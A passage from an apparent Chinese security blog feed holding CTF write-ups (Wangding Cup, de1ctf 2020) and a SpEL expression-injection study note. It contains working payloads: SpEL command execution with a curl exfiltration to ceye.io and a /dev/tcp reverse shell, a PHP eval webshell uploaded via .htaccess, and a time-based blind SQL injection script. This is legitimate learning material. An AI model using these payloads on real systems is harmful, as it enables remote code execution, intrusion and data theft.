http://http.requestbin.buuoj.cn/19tjk5d1?aaaaa=1&amp;raw=ls</code>,本地是可以的，打靶机的时候反而不行</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/05/12/2020年网鼎杯青龙组/">https://www.ccreater.top/2020/05/12/2020年网鼎杯青龙组/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpEL表达式注入漏洞</title>
      <link href="2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="SpEL表达式注入漏洞"><a href="#SpEL表达式注入漏洞" class="headerlink" title="SpEL表达式注入漏洞"></a>SpEL表达式注入漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring Expression Language（简称SpEL）。SpEL引擎作为Spring 组合里的表达式解析的基础 ，但它不直接依赖于Spring,可独立使用。 </p><h2 id="SpEL测试代码"><a href="#SpEL测试代码" class="headerlink" title="SpEL测试代码"></a>SpEL测试代码</h2><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);//Expression randomPhrase = parser.parseExpression(&quot;123&quot;,new TemplateParserContext());String message = (String) exp.getValue();//String message = exp.getValue(String.class);</code></pre><p> 上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。 </p><p><code>TemplateParserContext</code>添加了 <strong>表达式模板</strong> 解析器</p><h2 id="SpEL语法"><a href="#SpEL语法" class="headerlink" title="SpEL语法"></a>SpEL语法</h2><h3 id="使用SpEL接口进行表达式求值"><a href="#使用SpEL接口进行表达式求值" class="headerlink" title="使用SpEL接口进行表达式求值"></a>使用SpEL接口进行表达式求值</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;&#39;Hello World&#39;&quot;);String message = (String) exp.getValue();</code></pre><h3 id="方法调用，访问属性，调用构造函数"><a href="#方法调用，访问属性，调用构造函数" class="headerlink" title="方法调用，访问属性，调用构造函数"></a>方法调用，访问属性，调用构造函数</h3><p>这些都和平时的java没什么不同,demo:</p><p>访问属性：</p><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;&#39;123&#39;.bytes&quot;);System.out.println((Object)exp.getValue());</code></pre><p>方法调用：</p><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;&#39;123&#39;.length()&quot;);System.out.println((Object)exp.getValue());</code></pre><p>调用构造函数：</p><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;new String(1234)&quot;);System.out.println((Object)exp.getValue());</code></pre><h3 id="访问根对象属性方法等"><a href="#访问根对象属性方法等" class="headerlink" title="访问根对象属性方法等"></a>访问根对象属性方法等</h3><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();        Expression exp = parser.parseExpression(&quot;fucker+tou()&quot;);        System.out.println((Object)exp.getValue(new Object(){            public String fucker=&quot;fucker&quot;;            public String tou(){                return &quot;toutoutou&quot;;            };        }));</code></pre><p>结果：<code>fuckertoutoutou</code></p><h3 id="传递根对象-root"><a href="#传递根对象-root" class="headerlink" title="传递根对象/#root"></a>传递根对象/#root</h3><h4 id="StandardEvaluationContext"><a href="#StandardEvaluationContext" class="headerlink" title="StandardEvaluationContext"></a>StandardEvaluationContext</h4><pre><code class="java">// Create and set a calendarGregorianCalendar c = new GregorianCalendar();c.set(1856, 7, 9);// The constructor arguments are name, birthday, and nationality.Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;name&quot;);EvaluationContext context = new StandardEvaluationContext(tesla);String name = (String) exp.getValue(context);</code></pre><p>这里的root object 是 tesla,<code>parser.parseExpression(&quot;name&quot;);</code>会返回tesla的name属性</p><h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h4><pre><code class="java">// Create and set a calendarGregorianCalendar c = new GregorianCalendar();c.set(1856, 7, 9);// The constructor arguments are name, birthday, and nationality.Inventor tesla = new Inventor(&quot;Nikola Tesla&quot;, c.getTime(), &quot;Serbian&quot;);ExpressionParser parser = new SpelExpressionParser();Expression exp = parser.parseExpression(&quot;name&quot;);String name = (String) exp.getValue(tesla);</code></pre><h3 id="数组和列表和字典-取值"><a href="#数组和列表和字典-取值" class="headerlink" title="数组和列表和字典 取值"></a>数组和列表和字典 取值</h3><p> 属性名的第一个字母可以是大小写敏感的。数组和列表的内容可以使用方括号来标记 </p><pre><code class="java">ExpressionParser parser = new SpelExpressionParser();// Inventions ArrayStandardEvaluationContext teslaContext = new StandardEvaluationContext(tesla);// evaluates to &quot;Induction motor&quot;String invention = parser.parseExpression(&quot;inventions[3]&quot;).getValue(        teslaContext, String.class);// Members ListStandardEvaluationContext societyContext = new StandardEvaluationContext(ieee);// evaluates to &quot;Nikola Tesla&quot;String name = parser.parseExpression(&quot;Members[0].Name&quot;).getValue(        societyContext, String.class);// List and Array navigation// evaluates to &quot;Wireless communication&quot;String invention = parser.parseExpression(&quot;Members[0].Inventions[6]&quot;).getValue(        societyContext, String.class);</code></pre><p> Maps的值由方括号内指定字符串的Key来标识引用。在下面这个例子中，因为Officers map的Key是string类型，我们可以用过字符串常量指定。 </p><pre><code class="java">// Officer&#39;s DictionaryInventor pupin = parser.parseExpression(&quot;Officers[&#39;president&#39;]&quot;).getValue(        societyContext, Inventor.class);// evaluates to &quot;Idvor&quot;String city = parser.parseExpression(&quot;Officers[&#39;president&#39;].PlaceOfBirth.City&quot;).getValue(        societyContext, String.class);// setting valuesparser.parseExpression(&quot;Officers[&#39;advisors&#39;][0].PlaceOfBirth.Country&quot;).setValue(        societyContext, &quot;Croatia&quot;);</code></pre><h3 id="声明数组列表和字典"><a href="#声明数组列表和字典" class="headerlink" title="声明数组列表和字典"></a>声明数组列表和字典</h3><p>列表：</p><pre><code class="java">// evaluates to a Java list containing the four numbersList numbers = (List) parser.parseExpression(&quot;{1,2,3,4}&quot;).getValue(context);List listOfLists = (List) parser.parseExpression(&quot;{{'a','b'},{'x','y'}}&quot;).getValue(context);</code></pre><p>字典：</p><pre><code class="java">// evaluates to a Java map containing the two entriesMap inventorInfo = (Map) parser.parseExpression(&quot;{name:&#39;Nikola&#39;,dob:&#39;10-July-1856&#39;}&quot;).getValue(context);Map mapOfMaps = (Map) parser.parseExpression(&quot;{name:{first:&#39;Nikola&#39;,last:&#39;Tesla&#39;},dob:{day:10,month:&#39;July&#39;,year:1856}}&quot;).getValue(context);</code></pre><p>数组：</p><p> 数组可以使用类似于Java的语法创建，创建时可以事先指定数组的容量大小、这个是可选的。 在创建多维数组时还不支持事先指定初始化的值。</p><pre><code class="java">int[] numbers1 = (int[]) parser.parseExpression(&quot;new int[4]&quot;).getValue(context);</code></pre><h3 id="T操作符"><a href="#T操作符" class="headerlink" title="T操作符"></a>T操作符</h3><p><code>T()</code>运算符会调用类作用域的方法和常量。 </p><p> T操作符是一个特殊的操作符、可以同于指定java.lang.Class的实例（类型）。静态方法也可以通过这个操作符调用。  *<em>T()引用java.lang包里面的类型不需要限定包全名，但是其他类型的引用必须要。 *</em></p><pre><code class="java">Class dateClass = parser.parseExpression(&quot;T(java.util.Date)&quot;).getValue(Class.class);Class stringClass = parser.parseExpression(&quot;T(String)&quot;).getValue(Class.class);boolean trueValue = parser.parseExpression(        &quot;T(java.math.RoundingMode).CEILING &gt;= T(java.math.RoundingMode).FLOOR&quot;)        .getValue(Boolean.class);</code></pre><h3 id="表达式模板"><a href="#表达式模板" class="headerlink" title="表达式模板"></a>表达式模板</h3><p> 表达式模板运行在一段文本中混合包含一个或多个求值表达式模块。各个求值块都通过可被自定义的前后缀字符分隔，一个通用的选择是使用#{ }作为分隔符。 </p><pre><code class="java">String randomPhrase = parser.parseExpression(        &quot;random number is #{T(java.lang.Math).random()}&quot;,        new TemplateParserContext()).getValue(String.class);</code></pre><p>结果：<code>random number is xxxx</code></p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p> 表达式中的变量可以通过语法#变量名使用。变量可以在StandardEvaluationContext中通过方法setVariable设置。 </p><h4 id="this和root变量"><a href="#this和root变量" class="headerlink" title="this和root变量"></a>this和root变量</h4><p> #this变量永远指向当前表达式正在求值的对象（这时不需要限定全名）。变量#root总是指向根上下文对象。#this在表达式不同部分解析过程中可能会改变，但是#root总是指向根 </p><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>T()和new一个类时 除了java.lang下的类，其他类都要需要需要限定包全名</p><h2 id="SpEL导致的任意命令执行"><a href="#SpEL导致的任意命令执行" class="headerlink" title="SpEL导致的任意命令执行"></a>SpEL导致的任意命令执行</h2><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;nslookup a.com&quot;)T(Thread).sleep(10000)#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;nslookup a.com&#39;)new java.lang.ProcessBuilder({&#39;nslookup a.com&#39;}).start()</code></pre><p>利用反射构造绕过黑名单</p><pre><code>#{T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr &#39;\n&#39; &#39;-&#39;`&quot;})}</code></pre><p>利用ScriptEngineManager构造绕过黑名单</p><pre><code class="java">#{T(javax.script.ScriptEngineManager).newInstance()    .getEngineByName(&quot;nashorn&quot;)        .eval(&quot;s=[3];s[0]=&#39;/bin/bash&#39;;s[1]=&#39;-c&#39;;s[2]=&#39;ex&quot;+&quot;ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)}</code></pre><pre><code>&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15]    .invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7]        .invoke(null),&#39;curl 172.17.0.1:9898&#39;)</code></pre><p> 除此以外当执行的系统命令被过滤或者被URL编码掉时我们可以通过<code>String</code>类动态生成字符<br>如要执行的命令为<code>open /Applications/Calculator.app</code>我们可以采用<code>new java.lang.String(new byte[]{,,...})</code>或者<code>concat(T(java.lang.Character).toString())</code>嵌套来绕过 </p><pre><code>T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval(&#39;whatever java code in one statement&#39;).toString()</code></pre><h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><h4 id="new被过滤"><a href="#new被过滤" class="headerlink" title="new被过滤"></a>new被过滤</h4><p>可以用NEW</p><h3 id="一些相关的ctf题目"><a href="#一些相关的ctf题目" class="headerlink" title="一些相关的ctf题目"></a>一些相关的ctf题目</h3><h4 id="de1ctf2020-cal"><a href="#de1ctf2020-cal" class="headerlink" title="de1ctf2020 cal"></a>de1ctf2020 cal</h4><h3 id="SpEL提供的两个EvaluationContext的区别"><a href="#SpEL提供的两个EvaluationContext的区别" class="headerlink" title="SpEL提供的两个EvaluationContext的区别"></a>SpEL提供的两个<code>EvaluationContext</code>的区别</h3><p>SpEL提供的两个<code>EvaluationContext</code>的区别。<br>（EvaluationContext评估表达式以解析属性，方法或字段并帮助执行类型转换时使用该接口。有两个开箱即用的实现。）</p><ul><li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li><li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li></ul><p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。</p><p>所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">http://rui0.cn/archives/1043</a> </p><p> <a href="http://ifeve.com/spring-6-spel/" target="_blank" rel="noopener">http://ifeve.com/spring-6-spel/</a>  文档</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/05/06/SpEL表达式注入漏洞/">https://www.ccreater.top/2020/05/06/SpEL表达式注入漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpEL </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>de1ctf2020</title>
      <link href="2020/05/06/de1ctf2020/"/>
      <url>2020/05/06/de1ctf2020/</url>
      
        <content type="html"><![CDATA[<h1 id="de1ctf-2020"><a href="#de1ctf-2020" class="headerlink" title="de1ctf 2020"></a>de1ctf 2020</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><pre><code>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!</code></pre><p>测试发现：禁止ph结尾后缀，但是可以上传.htaccess</p><p>上传.htaccess</p><pre><code>AddType application/x-httpd-p\hp .jpg</code></pre><p>上传test.jpg</p><pre><code class="php">&lt;?=eval($_POST[0]);</code></pre><pre><code>De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}</code></pre><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a><strong>mixture</strong></h2><pre><code>index.phpprofile.phpselect.phpmember.phpadmin.phplogout.php</code></pre><p>除了admin其他用户不会检查密码</p><p>神奇的注释</p><pre><code>index.php:&lt;!------ Include the above in your HEAD tag ----------&gt;member.php:&lt;!--orderby--&gt;</code></pre><p>后来学长说member.php的orderby参数可以注入，我是有点不信的，后来想想自己没测出来也是正常的：</p><ol><li>我不知道orderby会将输入放在sql语句的位置</li><li>不知道有没有waf，无法确认waf是否存在</li></ol><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505122140.png" alt="image697"></p><p>。。。我应该fuzz一下的</p><p>黑名单：</p><pre><code>ifunion</code></pre><p>最后的payload:</p><pre><code class="sql">http://134.175.185.244/member.php?orderby=AND case when (ASCII(SUBSTRING((SELECT USER()),1,1)))=1 then BENCHMARK(100000,MD5(NOW())) ELSE 2 END</code></pre><p>盲注脚本：</p><pre><code class="python">import requestsimport time#修改bigger和sqlinj就好#实现bigger才能使用def findByDichotomy(begin,end):    max_num=end    while True:        mid=int((begin+end)/2)        if begin==max_num:            return False        if begin==end:            return begin        if end-begin==1:            if bigger(begin):                return end            else:                return begin        if bigger(mid):            begin=mid+1        else:            end=mid#待求数据大于numdef bigger(num):    return sqlinj(num)def less(num):    passdef equal(num):    passdef sqlinj(num):    burp0_url = &quot;http://134.175.185.244:80/member.php&quot;    param={&quot;orderby&quot;:&quot;AND case when (ASCII(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema=database()),{POS},1)))&gt;{GUESS} then BENCHMARK(100000,MD5(NOW())) ELSE 2 END&quot;.format(POS=pos,GUESS=num)}    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;p781mlp8a9sp3ggrf1solslvn3&quot;}    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    try :        requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param,timeout=2)    except Exception:        return True    print(&quot;test &quot;,num)    return Falseresult=&quot;&quot;pos=len(result)+1while True:    num=findByDichotomy(32,128)    if num is False:        print(result)        break    result+=chr(num)    print(result)    pos+=1</code></pre><pre><code>member,usersusers:id,username,moneymember:id,username,passwordadmin 18a960a3a0b3554b314ebe77fe545c85</code></pre><p>在cmd5上找到密码： goodlucktoyou </p><p>打开admin是一个phpinfo</p><p>search是一个类似文件包含的东东</p><p>但是很多都不行如/etc/passwd等等</p><p>fuzz后得到源码</p><p>select.php</p><pre><code class="php">&lt;?phpinclude &quot;profile.php&quot;;$search = $_POST[&#39;search&#39;];if($_SESSION[&#39;admin&#39;]==1){    print &lt;&lt;&lt;EOT&lt;form class=&quot;form&quot; action=&quot;select.php&quot; method=&quot;post&quot;&gt;    &lt;div class=&quot;form-group&quot;&gt;        &lt;label for=&quot;disabledTextInput&quot;&gt;You can search anything here!!&lt;/label&gt;&lt;/br&gt;        &lt;input type=&quot;text&quot; name=&quot;search&quot; id=&quot;fromgo&quot; class=&quot;form-control&quot;&gt;    &lt;/div&gt;    &lt;/div&gt;    &lt;div class=&quot;form-group&quot;&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;    &lt;/div&gt;&lt;/form&gt;EOT;}else{    print &lt;&lt;&lt;EOT  &lt;div class=&quot;container&quot;&gt;       &lt;div class=&quot;row&quot;  &gt;                          &lt;div class=&quot;col-md-10 col-md-offset-4&quot;&gt;                             &lt;div class=&quot;input-group&quot; display：block;margin：0 auto;&gt;                                                                                   &lt;button class=&quot;btn btn-info btn-search &quot; type=&quot;button&quot; &gt;You are not admin or not enough money!&lt;/button&gt;                              &lt;/span&gt;                &lt;/div&gt;&lt;!-- /input-group --&gt;                            &lt;/div&gt;&lt;!-- /.col-lg-6 --&gt;       &lt;/div&gt;  &lt;/div&gt;EOT;}if($_SESSION[&#39;admin&#39;]==1&amp;&amp;!empty($search)){    //var_dump(urldecode($search));    Minclude(urldecode($search));    //lookup($search);}</code></pre><p>admin.php</p><pre><code class="php">&lt;?phpinclude &quot;profile.php&quot;;session_start();if(empty($_SESSION[&#39;user&#39;])){    header(&quot;location: index.php&quot;);}if($_SESSION[&#39;admin&#39;]==1){    phpinfo();}else{    print &lt;&lt;&lt;EOT&lt;div class=&quot;row&quot;&gt;  &lt;div class=&quot;col-md-6 col-md-offset-4&quot;&gt;You are not admin!!!!&lt;/div&gt;&lt;/div&gt;EOT;}</code></pre><p>member.php</p><pre><code class="php">&lt;?phpinclude &quot;profile.php&quot;;include &quot;config.php&quot;;$orderby = $_GET[&#39;orderby&#39;];?&gt;    &lt;?php    print &lt;&lt;&lt;EOT&lt;div class=&quot;table-responsive&quot;&gt;    &lt;table class=&quot;table&quot;&gt;        &lt;!--orderby--&gt;        &lt;caption&gt;ALLmember&lt;/caption&gt;        &lt;thead&gt;        &lt;tr&gt;            &lt;th&gt;id&lt;/th&gt;            &lt;th&gt;username&lt;/th&gt;            &lt;th&gt;money&lt;/th&gt;&lt;/tr&gt;        &lt;/thead&gt;        &lt;tbody&gt;EOT;    if(!empty($orderby)){        $blacklist = &quot;/if|desc|sleep|rand|updatexml|\^|union|\|\||&amp;&amp;|regexp|exp|extractvalue|length|hex/i&quot;;        if(preg_match($blacklist, $orderby))            exit(&quot;No~~hacker!&quot;);        $sql = &quot;SELECT * FROM users order by id &quot;.$orderby;        $result = $mysqli-&gt;query($sql);        if($result===false){            $sql=&quot;SELECT * FROM users&quot;;        }    }    else{        $sql = &quot;SELECT * FROM users&quot;;    }        $result = $mysqli-&gt;query($sql);        /* free result set */        while($row = $result-&gt;fetch_row()){            //var_dump($row);            print &lt;&lt;&lt;EOT        &lt;tr&gt;            &lt;td&gt;$row[0]&lt;/td&gt;            &lt;td&gt;$row[1]&lt;/td&gt;            &lt;td&gt;$row[2]&lt;/td&gt;&lt;/tr&gt;        &lt;tr&gt;EOT;        }        $result-&gt;free();        $mysqli-&gt;close();    print &lt;&lt;&lt;EOT      &lt;/tbody&gt;  &lt;/table&gt;&lt;/div&gt;EOT;</code></pre><p>index.php</p><pre><code class="php">&lt;?phperror_reporting(0);include &quot;config.php&quot;;session_start();if(!empty($_SESSION[&#39;user&#39;])){    header(&quot;location: /profile.php&quot;);}    session_start();    $username = $_POST[&#39;username&#39;];    $password = $_POST[&#39;password&#39;];    if(!empty($username)&amp;&amp;!empty($password)){        if($username===&#39;admin&#39;)            {                $sql = &quot;select password from member&quot;;                $result = $mysqli-&gt;query($sql);                $row = $result-&gt;fetch_row();                if($row[0]===md5($password)){                    $_SESSION[&#39;user&#39;]=&#39;admin&#39;;                    $_SESSION[&#39;admin&#39;]=1;                    header(&quot;location: /profile.php&quot;);                }                else{                    echo &quot;&lt;script&gt;alert(&#39;nononon,admin password not right&#39;)&lt;/script&gt;&quot;;                }            }        else{            $_SESSION[&#39;user&#39;]=&#39;guest&#39;;            $_SESSION[&#39;admin&#39;]=0;            header(&quot;location: /profile.php&quot;);        }    }?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;profile&lt;/title&gt;    &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt;    &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;    &lt;style&gt;        .fakeimg {            height: 200px;            background: #aaa;        }    &lt;/style&gt;&lt;/head&gt;&lt;!------ Include the above in your HEAD tag ----------&gt;&lt;body&gt;    &lt;div id=&quot;login&quot;&gt;        &lt;div class=&quot;container&quot;&gt;            &lt;div id=&quot;login-row&quot; class=&quot;row justify-content-center align-items-center&quot;&gt;                &lt;div id=&quot;login-column&quot; class=&quot;col-md-6&quot;&gt;                    &lt;div id=&quot;login-box&quot; class=&quot;col-md-19&quot;&gt;                        &lt;form id=&quot;login-form&quot; class=&quot;form&quot; action=&quot;index.php&quot; method=&quot;post&quot;&gt;                            &lt;h3 class=&quot;text-center text-info&quot;&gt;Login&lt;/h3&gt;                            &lt;div class=&quot;form-group&quot;&gt;                                &lt;label for=&quot;username&quot; class=&quot;text-info&quot;&gt;Username:&lt;/label&gt;&lt;br&gt;                                &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot;&gt;                            &lt;/div&gt;                            &lt;div class=&quot;form-group&quot;&gt;                                &lt;label for=&quot;password&quot; class=&quot;text-info&quot;&gt;Password:&lt;/label&gt;&lt;br&gt;                                &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot;&gt;                            &lt;/div&gt;                            &lt;div class=&quot;form-group&quot;&gt;                                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;                            &lt;/div&gt;                        &lt;/form&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;</code></pre><p>emm,Minclude是什么神奇的东西</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505134518.png" alt="image8380"></p><p>fuzz后发现其实是读取内存里的内容</p><p>fuzz得到/readflag,从中可知flag在/flag中</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505143547.png" alt="image8517"></p><p>但是要运行的话，那就必须拿到shell,还是说flag在这个程序里</p><p>现有以下几种想法：</p><ol><li>利用/proc/xx/cwd/flag来拿到flag但是，fuzz到10000还没有</li><li>从内存中直接拿到flag(好像不行)</li><li>从程序中拿到flag(不会,也不清楚行不行)</li><li>拿到shell(没思路)</li><li>Minclude有洞（没找到）</li></ol><p>再见</p><p>em？</p><p><code>../../../../../../../../../../../../../../../../../../../../../../../etc/passwd</code></p><p>这样也能读取文件，有没有机会文件包含？</p><h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h2><pre><code class="php">&lt;?php//Clear the uploads directory every hourhighlight_file(__FILE__);$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if($_POST[&quot;submit&quot;]){    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){            die($_FILES[&quot;file&quot;][&quot;error&quot;]);        }        else{            $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;        }    }    else{        echo &quot;Not Allow!&quot;;    }}//内容限制：preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)==false //后缀限制：不能为：php，不包含..function Check(){    $BlackExts = array(&quot;php&quot;);    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);    $exts = trim(end($ext));    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp;         !in_array($exts, $BlackExts) &amp;&amp;         !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {          return true;    }    return false;}?&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>第一步绕过后缀名：.phP</p><p>第二步绕过文件内容：</p><pre><code class="php">&lt;?php$a = &#39;A&#39;;$b = &#39;SYSTEM&#39;;//$b = &#39;readfile&#39;;$c = &quot;POST&quot;;$vv = &#39;__&#39;;$v = &#39;_&#39;;function fuck($b){    $data = &#39;&#39;;    $a = &#39;A&#39;;    $vv = &#39;__&#39;;    $v = &#39;_&#39;;    for ($i = 0; $i &lt; strlen($b); $i++) {        if (ord($b[$i]) &gt;= ord(&#39;a&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;z&#39;)) {            $data .= &#39;($&#39; . $v . &#39;=$____),&#39;;            for ($a = ord(&#39;a&#39;); $a &lt; ord($b[$i]); $a++) {                $data .= &#39;($&#39; . $v . &#39;++),&#39;;            }        } else if (ord($b[$i]) &gt;= ord(&#39;A&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;Z&#39;)) {            $data .= &#39;($&#39; . $v . &#39;=$___),&#39;;            for ($a = ord(&#39;A&#39;); $a &lt; ord($b[$i]); $a++) {                $data .= &#39;($&#39; . $v . &#39;++),&#39;;            }        } else {            $data .= &#39;$&#39; . $v . &#39;=&quot;&#39; . $b[$i] . &#39;&quot;;&#39;;        }        $data .= &#39;($&#39; . $vv . &#39;.=$&#39; . $v.&#39;),&#39;;    }    return 